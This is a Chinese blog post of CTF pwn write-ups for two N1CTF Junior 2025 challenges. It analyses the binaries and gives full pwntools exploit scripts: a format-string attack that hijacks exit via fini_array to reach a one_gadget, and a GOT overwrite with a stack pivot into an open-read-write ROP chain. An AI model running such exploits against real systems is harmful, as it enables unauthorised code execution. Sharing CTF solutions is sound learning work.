---
layout: post
title: "[Pwn] Writeup - 2025 - N1ctf Junior"
date: 2025-02-11 18:01 +0800

description: >-
  西湖论剑2025 Pwn 方向 WriteUp ，目前只有 Remake 和 Write at will

categories: [CTF-Writeup | 非官方题解, Pwn-2025]
tags: [CTF, Pwn-Writeup, N1ctf Junior]
---

## Pwn 题解

### 1. Remake

#### 1-1 分析

首先先看一眼题目的保护，可以看到保护全开，简单不了一点

![image-20250211151427932](https://webimage.lufiende.work/1745490250269.png)

我们再看一眼代码

![image-20250211151713597](https://webimage.lufiende.work/1745490254862.png)

发现是**`非栈上格式化字符串`** ，但是输入**只有 0x10 个字节**，这意味着你很难去改两个地址，也就是通过常见的利用 `rbp` 指针很难（个人认为不可能）进行任意地址修改

也就是说只能改一个栈上有的地址里的内容

然后观察程序，我们会发现 `dword_4060` 标志着程序能否进入子函数

![image-20250211152227664](https://webimage.lufiende.work/1745490269908.png)

这个子函数十分明显了，~~我奶奶都会的~~简单栈上格式化字符串利用，输入空间管够

那么问题来了，我们怎么通过只改一个地址，让程序进入子函数呢，栈上并不会残留现有的 `dword_4060` 的地址，改这个进入函数明显不现实

值得关注的是，程序流会帮我们修改这个值，所以思路可以换成，让程序退出时返回的时候重新执行主函数就可以了

那么程序提出的时候会执行什么呢？没错，就是 `exit` 函数，准确来说是结束时需要执行的一系列 `exit 执行流`

![image-20250211152854001](https://webimage.lufiende.work/1745490272315.png)

众所周知，~~程序结束了其实也没有结束~~，我们的 `main` 通常都是由程序入口点 `_start` 中 `__libc_start_main` 来引导到我们的 `main` 函数的，结束会调用 `exit()`

![image-20250211173817708](https://webimage.lufiende.work/1745490274655.png)

那么我们便可以劫持 `exit 流` ，比如修改栈上残留的 `dl_fini()` 的位置（爆破，不稳定，没用过，但好像可以，比较吃版本），或者修改栈上残留的 `fini_array` 函数偏移存放位置的地址

![image-20250211173116471](https://webimage.lufiende.work/1745490277135.png)

可以看到，我们只要找到对应地址（理论是 PIE 基址）加个 8 就可以，因为下面留了 `main` 的地址，当然，我改过了，进去以后没什么好说的了

#### 1-2 exp

```python
#!/usr/bin/env python

'''
    author: Lufiende
'''

from pwn import *
from LibcSearcher import *
import ctypes

filename = "pwn_patched"
libcname = "/home/lufiende/Tools/CTF/Pwn/Glibc/pkgs/2.35-0ubuntu3.8/amd64/libc6_2.35-0ubuntu3.8_amd64/lib/x86_64-linux-gnu/libc.so.6"
host = '39.106.16.204'
port = 12138
filearch = 'amd64'
isAttach = 0
context.log_level = 'debug'
context.os = 'linux'
context.arch = filearch
context.terminal = ["/mnt/c/Windows/System32/cmd.exe", '/c', 'start', 'wsl.exe']

elf = context.binary = ELF(filename)
if libcname:
    libc = ELF(libcname)

gdbscript = '''
b *$rebase(0x1279)
set debug-file-directory /home/lufiende/Tools/CTF/Pwn/Glibc/pkgs/2.35-0ubuntu3.8/amd64/libc6-dbg_2.35-0ubuntu3.8_amd64/usr/lib/debug
set directories /home/lufiende/Tools/CTF/Pwn/Glibc/pkgs/2.35-0ubuntu3.8/amd64/glibc-source_2.35-0ubuntu3.8_all/usr/src/glibc/glibc-2.35
'''

processarg = {}

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = gdbscript, env=processarg)
    elif args.REMOTE:
        return remote(host, port)
    elif args.ATTACH:
        global isAttach
        isAttach = 1
        return process(elf.path, env=processarg)
    else:
        return process(elf.path, env=processarg)

def dbg():
    if isAttach:
        gdb.attach(io, gdbscript = gdbscript)
        
io = start()

############################################

payload='%{}c%{}$hhn'.format(8,30).encode()
payload=payload.ljust(0x10, b'a')
io.send(payload)

pause()

payload=b'%27$p%14$p'
payload=payload.ljust(0x10, b'a')
io.send(payload)

io.recvuntil(b'0x')
libc_base = int(io.recv(12), 16) - (0x7f75042945ad - 0x7f750420a000)
io.recvuntil(b'0x')
stack_addr = int(io.recv(12), 16)

success('libc_base: ' + hex(libc_base))
success('stack_addr: ' + hex(stack_addr))

stack_ret_addr = stack_addr + (0x7fff11985b98 - 0x7fff11985bd0)
log.info('stack_ret_addr: ' + hex(stack_ret_addr))

one = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
one_addr = one[0] + libc_base

# payload2 = b'aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p'
payload2 = fmtstr_payload(6, {stack_ret_addr:one_addr})
pause()
io.send(payload2)
############################################

io.interactive()
```

### 2. Write at Will

#### 2-1 分析

老样子，看一眼保护，压力小了一些（确信）

![image-20250211174135469](https://webimage.lufiende.work/1745490286424.png)

有沙箱，是白名单，`orw` 预定

![image-20250211174932938](https://webimage.lufiende.work/1745490294751.png)

看一眼代码

![image-20250211174402842](https://webimage.lufiende.work/1745490306574.png)

全在这里了，`sub_4012CF()` 的功能是读一个地址，功能就是读取地址和写地址，其中循环三次，理论上要把握机会，或者创造机会（无限读写的机会）

把握机会我是把握不住，不过程序循环会在到次数时执行 `exit` ，意味着我们可以对其动刀，把他的地址改掉，比如直接将其 `got` 地址改到循环内的读位置，就可以实现无限读，由于有沙箱，位置还是要多试几个

之后就要考虑怎么改了，泄露地址的话无法泄露栈地址，会遇到段错误（可以试一下），无法直接进行栈上 `ROP` 那么我们就要考虑另类的栈迁移

众所周知，延迟绑定有这样一个操作

![image-20250211175200116](https://webimage.lufiende.work/1745490302981.png)

`push` 后跳转，简直是栈迁移的绝佳位置，意味着我们只要向 `0x404008` 写入 `bss` 地址，并在 `0x404010` 写入 `pop rbp, ret` 就可以迁移

最后把 `exit_got` 写入 `0x401020` 就可以了

那我们思路就清晰了

1. 泄露 `libc`: 找个数据段的 `stdin` 即可
2. 修改 `exit_got` : 方便无限写
3. 写入 `read` 链子，最后把 `exit_got` 写入 `0x401020` 
4. 二次读构建

#### 2-2 注意事项

修改单位是 4 位，也就是 `p32()`

#### 2-3 exp

```python
#!/usr/bin/env python

'''
    time: 2025-02-09 13:11:56
'''

from pwn import *
from LibcSearcher import *
import ctypes

filename = "pwn_patched"
libcname = "/home/lufiende/Tools/CTF/Pwn/Glibc/pkgs/2.35-0ubuntu3.8/amd64/libc6_2.35-0ubuntu3.8_amd64/lib/x86_64-linux-gnu/libc.so.6"
host = "39.106.16.204"
port = 47962
filearch = 'amd64'
isAttach = 0
context.log_level = 'debug'
context.os = 'linux'
context.arch = filearch
context.terminal = ["/mnt/c/Windows/System32/cmd.exe", '/c', 'start', 'wsl.exe']

elf = context.binary = ELF(filename)
if libcname:
    libc = ELF(libcname)

gdbscript = '''
b *0x401571
set debug-file-directory /home/lufiende/Tools/CTF/Pwn/Glibc/pkgs/2.35-0ubuntu3.8/amd64/libc6-dbg_2.35-0ubuntu3.8_amd64/usr/lib/debug
set directories /home/lufiende/Tools/CTF/Pwn/Glibc/pkgs/2.35-0ubuntu3.8/amd64/glibc-source_2.35-0ubuntu3.8_all/usr/src/glibc/glibc-2.35
'''

processarg = {}

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = gdbscript, env=processarg)
    elif args.REMOTE:
        return remote(host, port)
    elif args.ATTACH:
        global isAttach
        isAttach = 1
        return process(elf.path, env=processarg)
    else:
        return process(elf.path, env=processarg)

def dbg():
    if isAttach:
        gdb.attach(io, gdbscript = gdbscript)
        
io = start()

############################################

def edit(index, content):
    io.sendlineafter(b'Exit', b'1')
    io.sendlineafter(b'get',str(index).encode())
    sleep(0.5)
    io.send(p32(content))

def edit2(index, content):
    io.sendlineafter(b'get',str(index).encode())
    sleep(0.5)
    io.send(p32(content))


def get(index):
    io.sendlineafter(b'Exit', b'2')
    io.sendlineafter(b'get',str(index).encode())

get(0x404080)

libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - (0x7f6243091780 - 0x7f6242e76000)
success(f"libc_base: {hex(libc_base)}")

pop_rsp = libc_base + 0x0000000000035732
pop_rdi = libc_base + 0x000000000002a3e5
pop_rsi = libc_base + 0x000000000016333a
pop_rdx_r12 = libc_base + 0x000000000011f2e7
pop_rax = libc_base + 0x00000000000439c8
syscall = libc_base + 0x00000000000d2975

openat_addr = libc_base + libc.sym['openat']
write_addr = libc_base + libc.sym['write']
read_addr = libc_base + libc.sym['read']
main_addr = 0x40160A

edit(0x404060,main_addr & 0xffffffff)
edit(0x404068,0x4040B0)
edit(0x4040B0, pop_rdi & 0xffffffff)

edit2(0x4040B4, pop_rdi >> 32)   
edit2(0x4040B8, 0)
edit2(0x4040C0, pop_rsi & 0xffffffff)
edit2(0x4040C4, pop_rsi >> 32)
edit2(0x4040C8, 0x4040D0)
edit2(0x4040D0, pop_rdx_r12 & 0xffffffff)    
edit2(0x4040D4, pop_rdx_r12 >> 32)
edit2(0x4040D8, 0x1000)  
edit2(0x4040E0, 0)
edit2(0x4040E8, read_addr & 0xffffffff)
edit2(0x4040EC, read_addr >> 32)

edit2(0x404008, 0x4040B0)
edit2(0x40400c, 0)
edit2(0x404010, pop_rsp & 0xffffffff)
edit2(0x404014, pop_rsp >> 32)

io.sendlineafter(b'get',str(0x404060).encode())
sleep(0.5)
io.send(p32(0x401020))

payload = (b'/flag\x00\x00'.ljust(0x10, b'\x00'))
payload += b'\x00\x00\x00\x00\x00\x00\x00\x00'
payload += b'\x00\x00\x00\x00\x00\x00\x00\x00' 
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(0x4040d0)
payload += p64(pop_rdx_r12)
payload += p64(0)
payload += p64(0)
payload += p64(openat_addr)
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi)
payload += p64(0x404200)
payload += p64(pop_rdx_r12)
payload += p64(0x100)
payload += p64(0)
payload += p64(read_addr)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(0x404200)
payload += p64(pop_rdx_r12)
payload += p64(0x100)
payload += p64(0)
payload += p64(write_addr)
pause()
io.sendline(payload)

############################################


io.interactive()
```

挖个坑，延迟绑定和 `exit` 劫持可以详细写
